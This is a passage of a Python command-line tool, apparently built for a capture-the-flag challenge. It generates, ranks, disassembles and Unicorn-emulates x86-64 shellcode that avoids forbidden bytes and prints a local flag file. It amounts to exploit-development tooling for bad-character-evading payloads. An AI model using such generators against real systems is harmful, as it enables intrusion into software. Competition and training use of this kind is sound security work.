                fail(f"unsupported/incorrect compat syscall {number}")
                return
        except Exception as exc:
            fail(f"compat syscall emulation failed: {exc}")
            return
        finally:
            syscalls.append(entry)

        if bytes(output) == flag_data:
            state["ok"] = True
            uc.emu_stop()
        elif len(output) >= len(flag_data):
            fail("compat stdout does not exactly match the flag data")

    uc.hook_add(UC_HOOK_CODE, hook_code)
    uc.hook_add(UC_HOOK_INTR, hook_interrupt)
    try:
        uc.emu_start(code_base, code_base + len(code), count=20_000)
    except UcError as exc:
        if not state["ok"] and state["error"] is None:
            state["error"] = f"unicorn: {exc}"

    text = bytes(output).decode("utf-8", errors="backslashreplace")
    if not state["ok"] and state["error"] is None:
        state["error"] = "shellcode stopped before emitting the complete flag"
    return EmulationResult(
        bool(state["ok"]), bytes(output).hex(), text, syscalls,
        int(state["instructions"]), state["error"],
    )


def _load_code(args: argparse.Namespace) -> bytes:
    if getattr(args, "hex", None):
        return parse_hex(args.hex)
    if getattr(args, "file", None):
        return Path(args.file).read_bytes()
    raise ValueError("provide --hex or --file")


def command_generate(args: argparse.Namespace) -> int:
    bad = parse_bad_bytes(args.bad)
    candidates = generate_candidates(
        args.path.encode(), bad, args.max_flag, args.beam, not args.no_wrappers
    )[: args.limit]
    flag_data = args.test_flag.encode()
    records = []
    for item in candidates:
        record = item.record(bad, args.disassemble)
        if args.emulate:
            record["emulation"] = asdict(emulate(item.code, flag_data, args.path.encode()))
        records.append(record)
    document = {
        "forbidden": [f"{byte:02x}" for byte in sorted(bad)],
        "path": args.path,
        "max_flag": args.max_flag,
        "candidate_count": len(records),
        "candidates": records,
    }
    rendered = json.dumps(document, ensure_ascii=False, indent=2)
    if args.json_out:
        Path(args.json_out).write_text(rendered + "\n", encoding="utf-8")
    print(rendered)
    return 0 if records else 2


def command_check(args: argparse.Namespace) -> int:
    code = _load_code(args)
    bad = parse_bad_bytes(args.bad)
    document = {
        "hex": code.hex(),
        "length": len(code),
        "cost": shellcode_cost(code),
        "forbidden": [f"{byte:02x}" for byte in sorted(bad)],
        "bad_hits": bad_hits(code, bad),
        "valid_forbidden": not bool(bad_hits(code, bad)),
        "disassembly": disassemble_x64(code),
    }
    print(json.dumps(document, ensure_ascii=False, indent=2))
    return 0 if document["valid_forbidden"] else 2


def command_emulate(args: argparse.Namespace) -> int:
    code = _load_code(args)
    result = emulate(code, args.flag.encode(), args.path.encode())
    document = {
        "hex": code.hex(),
        "length": len(code),
        "cost": shellcode_cost(code),
        "emulation": asdict(result),
    }
    print(json.dumps(document, ensure_ascii=False, indent=2))
    return 0 if result.ok else 3


def command_selftest(_args: argparse.Namespace) -> int:
    scenarios = [
        frozenset(),
        frozenset({0x00}),
        frozenset({0x66}),
        frozenset({0x0F}),
        frozenset({0x05}),
        frozenset({0x00, 0x0F, 0xFF}),
    ]
    summary = []
    for bad in scenarios:
        candidates = generate_candidates(b"flag", bad, 64, 32, wrappers=True)[:3]
        passing = []
        for candidate in candidates:
            result = emulate(candidate.code, b"UHCON{self_test}\n", b"flag")
            if result.ok and not bad_hits(candidate.code, bad):
                passing.append(candidate)
        summary.append(
            {
                "bad": [f"{byte:02x}" for byte in sorted(bad)],
                "generated": len(candidates),
                "passing": len(passing),
                "best": passing[0].record(bad) if passing else None,
            }
        )
    print(json.dumps(summary, ensure_ascii=False, indent=2))
    return 0 if all(item["passing"] for item in summary) else 4


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="command", required=True)

    generate = sub.add_parser("generate", help="rank shellcode variants")
    generate.add_argument("--bad", action="append", default=[], help="forbidden bytes, e.g. '00,0f,66'")
    generate.add_argument("--path", default="flag")
    generate.add_argument("--max-flag", type=int, default=127)
    generate.add_argument("--beam", type=int, default=512)
    generate.add_argument("--limit", type=int, default=20)
    generate.add_argument("--test-flag", default="UHCON{local_test_flag}\n")
    generate.add_argument("--emulate", action="store_true")
    generate.add_argument("--disassemble", action="store_true")
    generate.add_argument("--no-wrappers", action="store_true")
    generate.add_argument("--json-out")
    generate.set_defaults(func=command_generate)

    for name, help_text, func in (
        ("check", "inspect cost, bytes, and disassembly", command_check),
        ("emulate", "emulate Linux syscalls under Unicorn", command_emulate),
    ):
        command = sub.add_parser(name, help=help_text)
        source = command.add_mutually_exclusive_group(required=True)
        source.add_argument("--hex")
        source.add_argument("--file")
        command.add_argument("--bad", action="append", default=[])
        if name == "emulate":
            command.add_argument("--flag", default="UHCON{local_test_flag}\n")
            command.add_argument("--path", default="flag")
        command.set_defaults(func=func)

    selftest = sub.add_parser("selftest", help="exercise generation and emulation")
    selftest.set_defaults(func=command_selftest)
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return int(args.func(args))
    except (ValueError, OSError) as exc:
        parser.error(str(exc))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
